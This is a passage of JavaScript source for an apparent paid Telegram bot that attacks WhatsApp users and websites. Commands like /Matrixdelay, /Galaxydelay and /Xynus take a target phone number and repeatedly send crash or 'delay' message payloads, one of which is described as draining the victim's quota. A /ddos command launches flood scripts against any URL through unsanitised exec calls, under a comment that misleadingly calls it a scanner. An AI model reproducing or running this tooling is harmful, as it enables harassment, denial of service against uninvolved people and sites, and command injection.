      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
  if (!premiumUsers.some(user => user.id === msg.chat.id && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(msg.chat.id, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
<b>Please Buy Acces To Author</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Author - [ ˋཀ ]", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
    try {
      const chatId = msg.chat.id;
      const args = msg.text.split(" ");
      if (args.length < 3)
        return bot.sendMessage(chatId, "❌ Missing Input\nExample: /testfunction 62××× 10 (reply function)");

      const q = args[1];
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
      if (isNaN(jumlah) || jumlah <= 0)
        return bot.sendMessage(chatId, "❌ Jumlah harus angka");

      if (!msg.reply_to_message || !msg.reply_to_message.text)
        return bot.sendMessage(chatId, "❌ Reply dengan function");
        
      const processMsg = await bot.sendVideo(chatId, vidthumbnail, {
        caption: `<blockquote>「 God Of War — Raffnotdev [ 🍁 ] 」</blockquote>
⬡ ターゲット : ${q}
⬡ タイプ バグ : Uknown Function 
⬡ バグステータス : Proccesing`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
          ],
        },
      });
 
      const safeSock = createSafeSock(sock)
      const funcCode = msg.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return bot.sendMessage("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Succes`;

      try {
        await bot.editMessageCaption(finalText, {
          chat_id: chatId,
          message_id: processMsg.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      } catch (e) {
        await bot.sendVideo(chatId, vidthumbnail, {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      }
    } catch (err) {
      console.log(err);
    }
  });

const openaiKey = process.env.OPENAI_KEY;
const openai = new OpenAI({ apiKey: openaiKey });

// --- ( Case Ddos Menu ) --- \\
bot.onText(/\/ddos (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1].trim().split(/\s+/);

  const target = input[0];
  const time = input[1];
  const methods = input[2];

  if (!target || !time || !methods) {
    return bot.sendMessage(
      chatId,
      `Contoh Penggunaan:\n/ddos https://example.com 60 strike`,
      { parse_mode: "HTML" }
    );
  }

  await bot.sendPhoto(chatId, thumbnailUrl, {
    caption:
      `<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>\n` +
      `❀ Target: ${target}\n` +
      `❀ Time: ${time}\n` +
      `❀ Metode: ${methods}`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        {
          text: "Check ⵢ Target",
          url: `https://check-host.net/check-http?host=${target}`
        }
      ]]
    }
  });

  
  bot.sendMessage(
    chatId,
    `🚀 Scanning target...\n🎯 ${target}\n🕑 Durasi: ${time}s\n🧰 Tools: ${methods}`
  );

  // Jalankan tools sesuai metode — sebagai scanner, bukan serangan
  if (methods === "strike") {
    exec(`node ./methods/strike.js ${target} ${time}`);
  } else if (methods === "mix") {
    exec(`node ./methods/strike.js ${target} ${time}`);
    exec(`node ./methods/flood.js ${target} ${time}`);
    exec(`node ./methods/H2F3.js ${target} ${time}`);
    exec(`node ./methods/pidoras.js ${target} ${time}`);
  } else if (methods === "flood") {
    exec(`node ./methods/flood.js ${target} ${time}`);
  } else if (methods === "h2vip") {
    exec(`node ./methods/H2F3.js ${target} ${time}`);
    exec(`node ./methods/pidoras.js ${target} ${time}`);
  } else if (methods === "h2") {
    exec(`node ./methods/H2F3.js ${target} ${time}`);
  } else if (methods === "pidoras") {
    exec(`node ./methods/pidoras.js ${target} ${time}`);
  } else {
    return bot.sendMessage(chatId, "❌ Metode tidak dikenali atau format salah.");
  }

  
  setTimeout(() => {
    bot.sendMessage(chatId, `✅ Scan selesai! Target berhasil dianalisa 🎯`);
  }, time * 1000);
});
// ~ Case Bugs 1
bot.onText(/\/Matrixdelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 XYRUS DEATH — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Matrixdelay
ⵢ. Effect Bugs : Delay Hard Type Spam 3×
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 10; i++) {
    await InvisibleStc(sock, target);
    await new Promise((r) => setTimeout(r, 3000));
    await InvisibleStc(sock, target);
    await new Promise((r) => setTimeout(r, 3000));    
    await InvisibleStc(sock, target);
    await new Promise((r) => setTimeout(r, 3000));
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Matrixdelay
ⵢ. Effect Bugs : Delay Hard Type Spam 3×
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 2
bot.onText(/\/Rosedelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Rosedelay
ⵢ. Effect Bugs : Kuras Quota 
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 30; i++) {
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));    
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));
    await KyziiXZunn(target, sock);
    await new Promise((r) => setTimeout(r, 3000));
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Rosedelay
ⵢ. Effect Bugs : Kuras Quota
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// Case bug 3
bot.onText(/\/Tenseidelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Tenseidelay
ⵢ. Effect Bugs : Delay Hard 500%
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 30; i++) {
    await CarouselOtax(otax, target);
    await new Promise((r) => setTimeout(r, 3000));
    await CarouselOtax(otax, target);
    await new Promise((r) => setTimeout(r, 3000));
    await CarouselOtax(otax, target);
    await new Promise((r) => setTimeout(r, 3000));  
    await CarouselOtax(otax, target);
    await new Promise((r) => setTimeout(r, 3000));
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Tenseidelay
ⵢ. Effect Bugs : Delay Hard 500%
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// Case Bug 4
bot.onText(/\/Galaxydelay (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Galaxydelay
ⵢ. Effect Bugs : Delay Hard 1000%
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 30; i++) {
    await YxGHard(sock, target);
    await new Promise((r) => setTimeout(r, 1500));        
    await YxGHard(sock, target);
    await new Promise((r) => setTimeout(r, 1500)); 
    await YxGHard(sock, target);
    await new Promise((r) => setTimeout(r, 1500));
    await YxGHard(sock, target);
    await new Promise((r) => setTimeout(r, 1500));
    await YxGHard(sock, target);
    await new Promise((r) => setTimeout(r, 1500));
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Galaxydelay
ⵢ. Effect Bugs : Delay Hard 1000%
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//CASE BUG 4
bot.onText(/\/Smash (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/Raffnotdev" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Smash
ⵢ. Effect Bugs : Delay Blank Hard
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 1; i++) {    
    await XyrusDeath(sock, target);
    await new Promise((r) => setTimeout(r, 3000));
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Smash
ⵢ. Effect Bugs : Delay Blank Hard
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//CASE BUG 5
bot.onText(/\/Impact (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${number}@newsletter`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Impact
ⵢ. Effect Bugs : Combo All Delay
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 1; i++) {
    await FourSixCorex(sock, target);
    await new Promise((r) => setTimeout(r, 3000));   
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Impact
ⵢ. Effect Bugs : Combo All Delay
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
// ~ Case Bugs 6
bot.onText(/\/Xynus (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Xynus
ⵢ. Effect Bugs : Blank 1 Message
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 10; i++) {
    await KanjutHytam(sock, target);
    await new Promise((r) => setTimeout(r, 3000));


    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Xynus
ⵢ. Effect Bugs : Blank 1 Message
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 7
bot.onText(/\/Execute (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Execute
ⵢ. Effect Bugs : Blankk Spamm
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 40; i++) {
    await PaketExecute(sock, target);
    await new Promise((r) => setTimeout(r, 1700));
    await PaketExecute(sock, target);
    await new Promise((r) => setTimeout(r, 1700));
    await PaketExecute(sock, target);  
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Execute
ⵢ. Effect Bugs : Blankk Spamm
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 8
bot.onText(/\/Exeplosion (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "The 𝐊𝐢𝐧𝐤", url: "https://t.me/RAMZXHYNEWERA" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendVideo(chatId, vidthumbnail, {
      caption: `
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Exeplosion
ⵢ. Effect Bugs : Combo All Blank
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 1; i++) {
    await RamzGntng(sock, target); 
    await new Promise((r) => setTimeout(r, 1700));    
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote>「 Xyrus Death — RAMZXHYNEWERA [ 🍁 ] 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Exeplosion
ⵢ. Effect Bugs : Combo All Blank
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

<blockquote> © RAMZXHYNEWERA — The Xyrus Death</blockquote>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

/// ~ Case Bugs 9
bot.onText(/\/Excalibur (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
